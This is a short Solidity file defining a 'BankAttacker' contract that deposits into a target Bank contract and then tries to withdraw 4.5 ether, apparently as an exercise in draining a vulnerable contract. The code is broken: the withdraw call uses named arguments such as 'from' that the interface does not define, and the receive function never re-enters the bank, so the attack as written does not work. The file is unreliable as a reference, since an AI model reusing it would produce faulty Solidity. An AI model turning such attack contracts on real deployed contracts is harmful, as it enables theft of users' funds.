//SPDX-License-Identifier: Unlicense
pragma solidity ^0.8.0;
import "./Bank.sol";

interface IBank {
    function deposit() external payable;

    function withdraw(uint256 amount) external;
}

contract BankAttacker {
    mapping(address => uint256) balances;
    IBank public bank;
    Bank b = new Bank();
    address bankAddr;

    constructor(address _bank) {
        bank = IBank(_bank);
        bankAddr = _bank;
    }

    // Warning: attack should use more than 2 eth
    function attack() external payable {
        // b.withdraw(4500000000000000000);
        // definiraj from i value tak da ima eth u balanceu
        bank.deposit();
        bank.withdraw({from: bankAddr, amount: 4500000000000000000});
    }

    receive() external payable {
        balances[msg.sender] += msg.value;
    }
    fallback() external payable {}
}
